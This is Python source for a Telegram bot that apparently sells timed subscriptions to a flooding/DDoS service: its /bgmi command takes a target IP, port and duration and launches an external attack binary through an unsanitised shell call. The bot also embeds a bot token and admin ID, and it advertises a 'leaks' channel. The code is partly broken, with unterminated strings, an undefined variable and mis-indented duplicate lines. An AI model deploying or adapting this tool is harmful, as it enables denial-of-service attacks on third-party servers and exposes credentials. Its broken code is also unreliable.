import time
import subprocess
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackContext

# 🔥 Bot Configuration
BOT_TOKEN = "7432153187:AAHhVYbK5PCkEHN7TELau_VC9KktKOvPT9I"
ADMIN_ID = 8179218740  # Replace with your Admin ID

# 🚀 Authorized Users Dictionary {user_id: expiry_time}
AUTHORIZED_USERS = {}

# 🏴‍☠️ Function to Execute Binary
def execute_binary(ip, port, attack_time):
    command = f"./Ravi {ip} {port} {attack_time} 900"
    try:
        subprocess.run(command, shell=True, check=True)
        print("✅ Binary executed successfully!")
    except subprocess.CalledProcessError as e:
        print(f"❌ Error executing binary: {e}")

# 🎭 /start Command
def start(update: Update, context: CallbackContext) -> None:
    user = update.message.from_user
    username = user.first_name  
    user_id = user.id

    # 🔍 Profile Photo Fetch Karna
    photos = context.bot.get_user_profile_photos(user_id, limit=1)

    welcome_message = f"""
👋🏻 𝗪𝗘𝗟𝗖𝗢𝗠𝗘, {username} 💀! 🔥
━━━━━━━━━━━━━━━━━━━━━
🤖 𝗧𝗛𝗜𝗦 𝗜𝗦 𝗠𝗨𝗦𝗧𝗔𝗙𝗔 𝗕𝗢𝗧!
🚀 𝗘𝗻𝗷𝗼𝘆 𝗵𝗶𝗴𝗵-𝘀𝗽𝗲𝗲𝗱 𝗮𝘁𝘁𝗮𝗰𝗸𝘀!

📢 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹:
━━━━━━━━━━━━━━━━━━━━━
📌 𝗧𝗿𝘆 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱:
/bgmi - 🚀 Start an attack!

👑 𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 𝗕𝗬: @SIDIKI_MUSTAFA_47 💀
"""

    # 🛠 Inline Buttons
    keyboard = [
        [InlineKeyboardButton("[➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖]", url="https://t.me/MUSTAFALEAKS2")],
        [InlineKeyboardButton("👑 𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 𝗕𝗬  👑", url="https://t.me/SIDIKI_MUSTAFA_47")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # 📸 DP ke saath ya bina DP ke message send karna
    if photos.total_count > 0:
        photo_file = photos.photos[0][0].file_id
        context.bot.send_photo(chat_id=user_id, photo=photo_file, caption=welcome_message, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode="Markdown")

# 📜 /help Command
def help_command(update: Update, context: CallbackContext) -> None:
    help_message = """
💠 **COMMANDS LIST** 💠

✨ /start - 🚀 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 & 𝗜𝗡𝗙𝗢
✨ /help - 📜 𝗦𝗛𝗢𝗪 𝗛𝗘𝗟𝗣 𝗠𝗘𝗡𝗨
✨ /status - 📊 𝗖𝗛𝗘𝗖𝗞 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗦𝗧𝗔𝗧𝗨𝗦
✨ /check - 📡 𝗩𝗜𝗘𝗪 𝗢𝗡𝗚𝗢𝗜𝗡𝗚 𝗔𝗧𝗧𝗔𝗖𝗞𝗦
✨ /bgmi - 🚀 𝗦𝗧𝗔𝗥𝗧 𝗔𝗧𝗧𝗔𝗖𝗞
✨ /add - ✅ 𝗔𝗗𝗗 𝗨𝗦𝗘𝗥
✨ /remove - ❌ 𝗥𝗘𝗠𝗢𝗩𝗘 𝗨𝗦𝗘𝗥
✨ /users - 👥 𝗟𝗜𝗦𝗧 𝗨𝗦𝗘𝗥𝗦
"""
    update.message.reply_text(help_message, parse_mode="Markdown")

# 📊 /status Command
def status(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id in AUTHORIZED_USERS:
        expiry_time = AUTHORIZED_USERS[user_id]
        time_left = expiry_time - datetime.now()
        update.message.reply_text(f"👤 **User:** {username}\n\n
🆔 **ID:** {user_id}\n
💎 **Subscription:** ✅ ACTIVE\n
⏳ **Time Left:** {time_left}
        ")", parse_mode="Markdown")
    else:
        update.message.reply_text(f"👤 **User:** {username}\n\n
🆔 **ID:** {user_id}\n
💎 **Subscription:** ❌ INACTIVE", parse_mode="Markdown")

## 🚀 /bgmi Command (Executes Binary)
def bgmi(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    
    # ✅ Check if user is authorized
    if user_id not in AUTHORIZED_USERS:
        update.message.reply_text("❌ **You are not authorized to use this command!**", parse_mode="Markdown")
        return

    if len(context.args) < 3:
        update.message.reply_text("📌 **Usage:** `/bgmi <ip> <port> <time>`", parse_mode="Markdown")
        return

    ip = context.args[0]
    port = context.args[1]
    attack_time = context.args[2]

    update.message.reply_text(f"🚀 **ＡＴＴＡＣＫ ＩＮＩＴＩＡＴＥＤ!** 🚀
━━━━━━━━━━━━━━━━━━━
🎯 **ＴＡＲＧＥＴ:** `{ip}`
📡 **ＰＯＲＴ:** `{port}`
⏳ **ＤＵＲＡＴ𝐈ＯＮ:** `{attack_time} SEC`
💥 **ＳＴＡＴＵＳ:** **🔥 𝐋𝐀𝐔𝐍𝐂𝐇𝐈𝐍𝐆 𝐍𝐎𝐖! 🔥**
━━━━━━━━━━━━━━━━━━━
⚡ **ＳＴＡ𝐘 Ｃ𝐎ＮＮ𝐄Ｃ𝐓𝐄𝐃 𝐅𝐎𝐑 𝐔𝐏𝐃𝐀𝐓𝐄𝐒!**", parse_mode="Markdown")

    # Execute the binary
    execute_binary(ip, port, attack_time)

    update.message.reply_text("✅ **ＡＴＴＡＣ𝐊 ＣＯＭＰＬＥＴ𝐄!** ✅
━━━━━━━━━━━━━━━━━━━
🎯 **ＴＡＲＧＥＴ:** `{ip}`
📡 **ＰＯＲＴ:** `{port}`
⏳ **ＤＵＲＡＴ𝐈ＯＮ:** `{attack_time} min`
🎇 **ＳＴＡＴＵＳ:** **🛑 𝐀𝐓𝐓𝐀Ｃ𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃! 🛑**
━━━━━━━━━━━━━━━━━━━
🔥 **𝐖𝐄'𝐑𝐄 𝐃𝐎𝐍𝐄! 𝐋𝐄𝐓'𝐒 𝐌𝐎𝐕𝐄 𝐎𝐍 𝐓𝐎 𝐓𝐇𝐄 𝐍𝐄𝐗𝐓!** 🔥", parse_mode="Markdown")

# ✅ /add Command
def add_user(update: Update, context: CallbackContext) -> None:
    if update.message.from_user.id != ADMIN_ID:
        update.message.reply_text("❌ **𝗢𝗡𝗟𝗬 𝗙𝗔𝗧𝗛𝗘𝗥 𝗢𝗙 𝗕𝗢𝗧 𝗖𝗔𝗡 𝗔𝗗𝗗 𝗨𝗦𝗘𝗥𝗦!**", parse_mode="Markdown")
        return
    
    if len(context.args) < 2:
        update.message.reply_text("❌ **Usage:** /add `<user_id>` `<duration_in_days>`", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])
        days = int(context.args[1])

        duration = context.args[1]
        unit = context.args[2].lower() if len(context.args) > 2 else "days"

        time_units = {
            "minutes": timedelta(minutes=int(duration)),
            "hours": timedelta(hours=int(duration)),
            "days": timedelta(days=int(duration)),
            "weeks": timedelta(weeks=int(duration)),
            "months": timedelta(days=int(duration) * 30)  # Approximate month as 30 days
        }

        if unit not in time_units:
            update.message.reply_text("❌ **Invalid time unit! Use minutes, hours, days, weeks, or months.**", parse_mode="Markdown")
            return

        expiry_time = datetime.now() + time_units[unit]
        AUTHORIZED_USERS[user_id] = expiry_time
        update.message.reply_text(f"✅ **User {user_id} added for {duration} {unit}!**", parse_mode="Markdown")
                AUTHORIZED_USERS[user_id] = expiry_time
        update.message.reply_text(f"✅ **User {user_id} added for {days} days!**", parse_mode="Markdown")
    except ValueError:
        update.message.reply_text("❌ **Invalid input! Use numbers only.**", parse_mode="Markdown")

# ❌ /remove Command
def remove_user(update: Update, context: CallbackContext) -> None:
    if update.message.from_user.id != ADMIN_ID:
        update.message.reply_text("❌ **You are not authorized to remove users!**", parse_mode="Markdown")
        return

    if len(context.args) < 1:
        update.message.reply_text("❌ **Usage:** /remove `<user_id>`", parse_mode="Markdown")
        return

    try:
        user_id = int(context.args[0])
        if user_id in AUTHORIZED_USERS:
            del AUTHORIZED_USERS[user_id]
            update.message.reply_text(f"✅ **User {user_id} removed!**", parse_mode="Markdown")
        else:
            update.message.reply_text("❌ **User not found!**", parse_mode="Markdown")
    except ValueError:
        update.message.reply_text("❌ **Invalid input! Use numbers only.**", parse_mode="Markdown")

# 👥 /users Command
def list_users(update: Update, context: CallbackContext) -> None:
    if update.message.from_user.id != ADMIN_ID:
        update.message.reply_text("❌ **You are not authorized to view users!**", parse_mode="Markdown")
        return

    if not AUTHORIZED_USERS:
        update.message.reply_text("📌 **No authorized users found!**", parse_mode="Markdown")
        return

    user_list = "\n".join([f"👤 **User ID:** `{user_id}` - ⏳ Expires: {expiry_time}" for user_id, expiry_time in AUTHORIZED_USERS.items()])
    update.message.reply_text(f"📋 **Authorized Users:**\n\n{user_list}", parse_mode="Markdown")

# 🔥 Bot Initialization

# 📡 /check Command (Show Ongoing Attacks with Attacker Info)
def check_attacks(update: Update, context: CallbackContext) -> None:
    if update.message.from_user.id != ADMIN_ID:
        update.message.reply_text("❌ **You are not authorized to use this command!**", parse_mode="Markdown")
        return
    
    try:
        # Running processes check karein jo mustafa binary use kar rahe hain
        result = subprocess.run("pgrep -a mustafa", shell=True, capture_output=True, text=True)
        output = result.stdout.strip()

        if output:
            attack_list = []
            for line in output.split("\n"):
                parts = line.split()
                if len(parts) >= 5:
                    pid = parts[0]  # Process ID
                    username = update.message.from_user.username or update.message.from_user.first_name  # Attacker's Username
                    ip = parts[2]   # Target IP
                    port = parts[3] # Target Port
                    duration = parts[4] # Attack duration in seconds

                    attack_list.append(f"👤 **Attacker:** {username}\n🎯 **Target:** {ip}\n📡 **Port:** {port}\n⏳ **Time Left:** {duration} sec\n🆔 **Process ID:** {pid}\n━━━━━━━━━━━━━━━━━━━")

            attack_message = "\n".join(attack_list)
            update.message.reply_text(f"📡 **Ongoing Attacks:**\n\n{attack_message}", parse_mode="Markdown")
        else:
            update.message.reply_text("✅ **No ongoing attacks found!**", parse_mode="Markdown")
    
    except Exception as e:
        update.message.reply_text(f"❌ **Error checking attacks:** {e}", parse_mode="Markdown")


def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help_command))
    dp.add_handler(CommandHandler("status", status))
    dp.add_handler(CommandHandler("bgmi", bgmi, pass_args=True))
    dp.add_handler(CommandHandler("add", add_user, pass_args=True))
    dp.add_handler(CommandHandler("remove", remove_user, pass_args=True))
    dp.add_handler(CommandHandler("users", list_users))

    dp.add_handler(CommandHandler("check", check_attacks))
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
